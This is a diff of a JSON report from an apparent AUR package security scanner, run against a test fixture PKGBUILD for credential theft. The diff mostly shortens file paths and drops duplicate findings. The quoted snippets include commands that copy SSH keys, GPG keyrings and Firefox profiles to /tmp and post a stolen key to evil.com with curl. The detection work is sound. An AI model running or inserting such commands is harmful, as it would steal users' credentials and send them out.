@@ -9,7 +9,7 @@
       "title": "SSH key access",
       "description": "Accessing SSH private keys during build/install",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 14,
         "column": 9,
         "snippet": "    cat ~/.ssh/id_rsa > /tmp/stolen_key"
@@ -27,7 +27,7 @@
       "title": "GPG key access",
       "description": "Accessing GPG keyring during build/install",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 17,
         "column": 30,
         "snippet": "    tar -czf /tmp/gpg.tar.gz ~/.gnupg/"
@@ -45,7 +45,7 @@
       "title": "Browser profile access",
       "description": "Accessing browser profiles may indicate credential theft",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 20,
         "column": 13,
         "snippet": "    cp -r ~/.mozilla/firefox /tmp/firefox_profile"
@@ -63,7 +63,7 @@
       "title": "Curl POST data exfiltration",
       "description": "Sending data to external servers via curl POST",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 23,
         "column": 5,
         "snippet": "    curl -X POST -d @/tmp/stolen_key https://evil.com/collect"
@@ -81,7 +81,7 @@
       "title": "Curl POST data exfiltration",
       "description": "Sending data to external servers via curl POST",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 23,
         "column": 5,
         "snippet": "    curl -X POST -d @/tmp/stolen_key https://evil.com/collect"
@@ -99,7 +99,7 @@
       "title": "Hidden file creation in home",
       "description": "Creating hidden files in user home directory",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 14,
         "column": 9,
         "snippet": "    cat ~/.ssh/id_rsa > /tmp/stolen_key"
@@ -117,7 +117,7 @@
       "title": "Hidden file creation in home",
       "description": "Creating hidden files in user home directory",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 17,
         "column": 30,
         "snippet": "    tar -czf /tmp/gpg.tar.gz ~/.gnupg/"
@@ -135,7 +135,7 @@
       "title": "Hidden file creation in home",
       "description": "Creating hidden files in user home directory",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 20,
         "column": 11,
         "snippet": "    cp -r ~/.mozilla/firefox /tmp/firefox_profile"
@@ -147,49 +147,13 @@
       }
     },
     {
-      "id": "HIDDEN-002",
-      "severity": "high",
-      "category": "malicious_code",
-      "title": "Tmp directory execution",
-      "description": "Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.",
-      "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
-        "line": 14,
-        "column": 25,
-        "snippet": "    cat ~/.ssh/id_rsa > /tmp/stolen_key"
-      },
-      "recommendation": "Packages should not execute from /tmp",
-      "cwe_id": null,
-      "metadata": {
-        "matched_text": "/tmp/stolen_key"
-      }
-    },
-    {
-      "id": "HIDDEN-002",
-      "severity": "high",
-      "category": "malicious_code",
-      "title": "Tmp directory execution",
-      "description": "Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.",
-      "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
-        "line": 20,
-        "column": 30,
-        "snippet": "    cp -r ~/.mozilla/firefox /tmp/firefox_profile"
-      },
-      "recommendation": "Packages should not execute from /tmp",
-      "cwe_id": null,
-      "metadata": {
-        "matched_text": "/tmp/firefox_profile"
-      }
-    },
-    {
       "id": "FUNC-001",
       "severity": "high",
       "category": "network_security",
       "title": "Network access in build function",
       "description": "Function 'build' contains network access command 'curl'",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": 12,
         "column": null,
         "snippet": null
@@ -208,7 +172,7 @@
       "title": "No sources with build function",
       "description": "Package has build() function but no source array",
       "location": {
-        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD",
+        "file": "tests/fixtures/malicious/credential-theft/PKGBUILD",
         "line": null,
         "column": null,
         "snippet": null
@@ -219,8 +183,8 @@
     }
   ],
   "scanned_files": [
-    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/credential-theft/PKGBUILD"
+    "tests/fixtures/malicious/credential-theft/PKGBUILD"
   ],
-  "timestamp": "2026-06-15T01:57:16.467072010Z",
-  "scan_duration_ms": 2
+  "timestamp": "2026-06-15T10:43:30.041236365Z",
+  "scan_duration_ms": 4
 }
